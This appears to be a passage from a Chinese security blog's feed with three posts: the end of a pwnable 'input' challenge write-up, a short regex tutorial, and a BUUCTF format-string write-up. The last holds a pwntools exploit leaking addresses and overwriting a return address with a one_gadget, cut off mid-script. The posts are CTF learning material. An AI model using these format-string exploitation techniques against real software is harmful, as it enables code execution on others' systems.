class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码大概意思就是给程序五种输入方法，如果程序从指定方法获得了对应的值那么这一关被判正确并且进入下一关，过去五关就能拿到flag。</p><p>第一关是命令行输入，要求命令行有100个参数，然后argv[‘A’]=”\x00”，argv[‘B’]=”\x20\x0a\x0d”，那就给命令行一百个参数，然后满足一下对应的要求即可，这里我们可以选择用execve去执行这个程序。然后程序构造命令行的参数传给第二个参数就可以通过第一关了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    execve(<span class="string">&quot;./input&quot;</span>,arg,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行就可以发现第一关过去了，这个源码可以放在自己电脑编译然后测试哦，等到自己能打通了再去考虑服务器的环境。</p><p>第二关虽然是stdio，但是它这里不仅要求读取特殊字节，还要从stderr中读入特定字节。这里卡了有点久，最后还是google了一下才得到的一个好方法，这里我也贴一下这位师傅这篇博客，我做这个也是参照这位师傅的博客做的–&gt;<a href="https://r00tk1ts.github.io/2018/03/06/input/%EF%BC%8C%E7%89%B9%E6%AD%A4%E6%84%9F%E8%B0%A2%EF%BC%81">https://r00tk1ts.github.io/2018/03/06/input/，特此感谢！</a></p><p>这里呢选择fork一个子进程，然后父子进程用管道通信，父进程把管道接口定向到stdin和stderr后去执行input。子进程通过管道给父进程发送数据，然后父进程就能从stdin和stderr中得到数据了。</p><p>第三关也比较简单，从环境变量中获得对应数据。环境变量其实跟命令行参数输入差不多，execve第三个参数就是环境变量，传入一个指针数组，然后里面给一个xxx=yyy，那么它从环境变量中get(xxx)就会获得yyy。</p><p>第四个就更简单了，它从文件读你就对应写一个文件给它好了。</p><p>第五个稍微有点东西，是关于socket编程的，基本上也可以超，但是也遇到诸多问题，我一个exp并不能打通，我运行一个exp之后会被挂起，我再运行一个exp才能让第一个exp getflag，盲猜是它数据没接收到，我测试之后发现sleep也不管用，但是这一关已经能打过去了。</p><p>但是由于pwnable服务器的特殊机制，我们home 目录没有写的权限，所以得去寻找我们文件能落地的地方，那就是/tmp目录，这里的目录我们有写的权限，但是没有读的权限，所以我们在里面新建一个自己的文件夹，然后把input可执行文件和flag文件链接到这个目录来，最后上传exp执行就可以拿到flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *fd=fopen(<span class="string">&quot;\x0a&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    fwrite(buf,<span class="number">1</span>,<span class="number">4</span>,fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pipe_stdin[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,pipe_stderr[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">char</span> *env[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;C&#x27;</span>],<span class="string">&quot;55555&quot;</span>);</span><br><span class="line">    env[<span class="number">0</span>]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(env[<span class="number">0</span>],<span class="string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>);</span><br><span class="line">    env[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    pipe(pipe_stdin);</span><br><span class="line">    pipe(pipe_stderr);</span><br><span class="line">    <span class="keyword">int</span> p=fork();</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>)&#123;</span><br><span class="line">        write(pipe_stdin[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">        write(pipe_stderr[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        dup2(pipe_stdin[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">        dup2(pipe_stderr[<span class="number">0</span>],<span class="number">2</span>);</span><br><span class="line">        execve(<span class="string">&quot;./input&quot;</span>,arg,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    saddr.sin_port = htons(<span class="number">55555</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;connenct\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sockfd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Cannot connect to server!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(sockfd, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    close(sockfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;真的推荐学linux C的IO一定得做做这个，真的能学到很多。&lt;/p&gt;</summary>
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    <category term="IO" scheme="http://example.com/categories/linux/IO/"/>
    
    
  </entry>
  
  <entry>
    <title>正则表达式的使用</title>
    <link href="http://example.com/2021/11/19/Re/"/>
    <id>http://example.com/2021/11/19/Re/</id>
    <published>2021-11-19T02:00:00.000Z</published>
    <updated>2021-11-20T14:37:28.902Z</updated>
    
    <content type="html"><![CDATA[<p>最近在和战队一起的比赛中又出现了诸多想要学习的知识点，那就是re和QRcode，今天先学一下这个正则吧。</p><span id="more"></span><p>那么我已开始接触正则呢，应该是在学爬虫的时候，因为当时爬虫学的不太好也就没有接着学正则匹配。后来在换了linux系统之后经常会用到一个很有用的东西，那就是|grep。不得不说这个在找东西的时候真的是很有用的，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ls -l | grep &quot;&quot;</span><br></pre></td></tr></table></figure><p>那么本次和Nepnep战队参加xctf分区赛也是有一道修复二维码的题目，当时师傅们可能有些点没注意到，导致最后修复的二维码多达16000的扫描结果。</p><p><img src="/2021/11/19/Re/1.png" alt="1"></p><p>得到结果之后本以为要经历漫长的人工过滤，可是咱们战队的一位爷爷直接solved，而这位爷爷就是直接用了正则匹配。</p><p><img src="/2021/11/19/Re/2.png" alt="2"></p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p><p>许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。</p><p>以上来自维基百科。</p><h3 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h3><p>右斜杠(\)老转义符了，在右斜杠之后的一个字将会带有特殊含义，如果要匹配右斜杠则需要双写。</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>通配符我们熟知的就是星号(*)和问号(?)，一般情况下它们分别代表任意多个字符或者是任意一个字符，在正则表达式中存在三种类似的符号，并且不能匹配任意字符，只能代表前面一个字符的数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+：匹配一个或多个字符</span><br><span class="line">?：匹配一个或零个字符</span><br><span class="line">*：匹配零个或多个字符</span><br></pre></td></tr></table></figure><p>例如</p><p>‘a+’可以匹配’a’,’aa’,’aaa’,’aaaa’……等字符串。</p><p>‘a?’可以匹配’a’或者空串</p><p>‘a*’则可以匹配第一种情况和第二种情况的并集。</p><h3 id="匹配任意字符"><a href="#匹配任意字符" class="headerlink" title="匹配任意字符"></a>匹配任意字符</h3><p>[]方括号用于匹配单个字符。</p><p>例如</p><p>[abcde]可以匹配a,b,c,d,e中的任意一个字符。</p><p>如果加上^则代表匹配除了列表以外的所有字符。</p><p>例如</p><p>[^a]表示匹配所有非’a’的字符。</p><h3 id="匹配次数限定"><a href="#匹配次数限定" class="headerlink" title="匹配次数限定"></a>匹配次数限定</h3><p>{}用于限定匹配次数</p><p>例如：</p><p>[ab]{3}表示[ab]匹配三次，[ab]{3,}表示至少匹配三次。</p><p>就先学这么多吧，后续再学就再加。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在和战队一起的比赛中又出现了诸多想要学习的知识点，那就是re和QRcode，今天先学一下这个正则吧。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>npuctf_2020_level2 writeup</title>
    <link href="http://example.com/2021/11/10/npuctf_2020_level2/"/>
    <id>http://example.com/2021/11/10/npuctf_2020_level2/</id>
    <published>2021-11-10T14:00:00.000Z</published>
    <updated>2021-12-15T17:21:52.400Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#npuctf_2020_level2">npuctf_2020_level2</a></p><span id="more"></span><p>这题刷新了我对格式化字符串的利用，来康康吧。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>十分简单，就是主函数while循环输入然后格式化字符串漏洞，但是不同的是这个格式化字符串并不在stack段而是在bss段上的。那就考虑考虑字符串在bss段和在stack段的区别，我们平时做的都是在stack段的，因为buf输入一般都是在printf调用之前，所以printf的栈帧会比buf低，而参数在高地址，那么此时printf的参数我们就可控，在buf上写上一个地址然后算出偏移用%n格式串去写就能基本达到任意title写的目的。但是如果它在bss段上或者是在堆上，那么格式化字符串的参数控制不了我们就得另寻方法了。其实也还好，第一步我们可以先控制一个栈的参数，栈里面都会有存函数的ebp，那么可以通过这个来写一个目的地址，再通过目的地址任意写我们想写的内容。讲简单一点其实也就是控制一个栈的地址然后写上目的地址，最后再往目的地址写东西，有格式化字符串漏洞那么基本stack，code和libc地址跟送的一样随便泄露。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>先gdb起这个程序，然后运行到printf这边观察栈情况。</p><p><img src="/2021/11/10/npuctf_2020_level2/1.png" alt="1"></p><p>可以观察到libc的应该是第7个参数，第9个参数有一个栈地址，第六个参数和第11个参数有一个程序加载地址可以泄露。这里的参数个数指的是排除格式化字符串参数后的计数，比如printf(“%d”,1);这里我就直接把1当成第一个参数了。</p><p>所以开局三个地址都出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br></pre></td></tr></table></figure><p>然后可以看到那个libc得到的值实际上是返回地址，因为main的父函数就是libc_start_main函数嘛。所以我们应该要写这里，怎么写呢？通过栈地址，我们可以通过修改第9个参数的低两个字节到返回地址，然后再%n覆盖，因为不能一次写太多，所以每一次修改最多两个字节，然后马上把这个地址向后移两位然后再写两个字节，至于写什么，那自然是one_gadget最简便了，并且第一个就符合条件了。但是实际操作的时候我傻了，我是通过这个地址写到另一个地址的低两位字节改成了返回地址再通过那个写的，现在想来是在多此一举，但是这样的好处就是可以实现真正的任意写，假如这个题目变成noreturn，那么就只能靠劫持一些hook或者got表来实现指令跳转了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">2.23 64 libc的one_gadget条件分别是rax,[rsp+0x30,+0x50,+0x70]==NULL</span></span><br><span class="line"><span class="string">2.27 64 libc的one_gadget条件分别是rsp&amp;0xf==0&amp;&amp;rcx==0 || [rsp+0x40，+0x70]==NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">one_2_23_32=[<span class="number">0x3ac6c</span>,<span class="number">0x3ac6e</span>,<span class="number">0x3ac72</span>,<span class="number">0x3ac79</span>,<span class="number">0x5fbd5</span>,<span class="number">0x5fbd6</span>]</span><br><span class="line">one_2_23_64=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_2_23_buu32=[<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">one_2_23_buu64=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_2_27_32=[<span class="number">0x3d123</span>,<span class="number">0x3d125</span>,<span class="number">0x3d129</span>,<span class="number">0x3d130</span>,<span class="number">0x67b4f</span>,<span class="number">0x67b50</span>,<span class="number">0x1380be</span>,<span class="number">0x1380bf</span>]</span><br><span class="line">one_2_27_64=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">one_2_27_buu32=[<span class="number">0x3cbea</span>,<span class="number">0x3cbec</span>,<span class="number">0x3cbf0</span>,<span class="number">0x3cbf7</span>,<span class="number">0x6729f</span>,<span class="number">0x672a0</span>,<span class="number">0x13573e</span>,<span class="number">0x13573f</span>]</span><br><span class="line">one_2_27_buu64=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span>,ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> one</span><br><span class="line">    bit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> context.arch==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    one=<span class="built_in">eval</span>(<span class="string">&#x27;one_&#x27;</span>+libc_version.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;_&#x27;</span>)+<span class="string">&#x27;_&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit))</span><br><span class="line">    libc=<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        context.log_level=<span class="number">20</span></span><br><span class="line">        p=remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),ELF(libc),p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,length,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./npuctf_2020_level2&#x27;</span>,port=<span class="number">26764</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br><span class="line"></span><br><span class="line">shell=libc_addr+one[<span class="number">0</span>]</span><br><span class="line">success(<span class="string">&#x27;shell:&#x27;</span>+<span class="built_in">hex</span>(shell))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">8</span>:<span class="keyword">break</span></span><br><span class="line">    payload=<span 